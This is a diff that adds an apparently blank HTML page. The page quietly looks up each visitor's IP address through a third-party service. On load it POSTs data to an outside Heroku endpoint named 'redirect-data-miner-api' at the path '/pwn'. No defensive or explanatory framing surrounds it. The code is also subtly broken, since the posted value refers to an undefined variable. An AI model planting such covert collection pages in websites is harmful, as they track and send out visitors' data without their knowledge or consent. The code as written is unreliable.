@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title></title>
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
+    <script>
+        // fetch('http://localhost:8000/pwn', {
+        fetch('https://redirect-data-miner-api.herokuapp.com/pwn', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json;charset=utf-8'
+            },
+            body: JSON.stringify({
+                screen: something
+            })
+        })
+        function getIP(json) {  
+            console.log(json.ip);  
+        }  
+
+        
+    </script>
+</head>
+<body>
+</body>
+</html>
